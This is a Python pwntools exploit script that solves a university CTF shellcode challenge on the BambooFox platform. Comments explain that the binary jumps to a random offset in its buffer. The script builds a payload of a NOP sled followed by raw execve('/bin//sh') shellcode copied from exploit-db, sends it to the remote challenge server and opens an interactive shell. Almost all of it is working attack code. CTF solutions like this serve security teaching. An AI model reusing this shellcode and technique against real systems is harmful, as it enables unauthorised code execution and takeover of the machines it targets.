#!/bin/usr/python3
from pwn import *

elf = context.binary = ELF("./shellcode")
context.log_level = "info"
context.delete_corefiles = True
context.terminal = ["tmux", "split", "-h"]

#read = 0x4006a1
#close file = 0x4006e9

# https://bamboofox.cs.nctu.edu.tw/courses/12/challenges/249
# the first 8 bytes for eax + first value of p64()
# it will read a byte in /dev/urandom and the value and store in rax
# there is a "lea    rdx, [rbp - 0x1020]; add    rax, rdx; jmp rax; " in this program 
# which means it will execute the shellcode which puts in address "[rdx] + rax"
# since we cannot know the /dev/urandom value in previous, we need to figure out some method to pass this address issue.
# we can found that we can enter 0x1000 bytes for my shellcode. 
# so i just add a lot of "nop" before my shellcode.
# notice that "movsx  eax, al" maybe cause the dirty value for $rax. so it wont work everytime. just try more times.
payload = p64(0x0) 
payload += 0x400 * b'\x90'
# I find this shellcode online. 
# https://www.exploit-db.com/exploits/46907
payload += b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"


f = open("payload", "wb")
f.write(payload)
f.close()

#p = process("./shellcode")
p = remote("bamboofox.cs.nctu.edu.tw", 12001)
p.sendline(payload)


p.interactive()


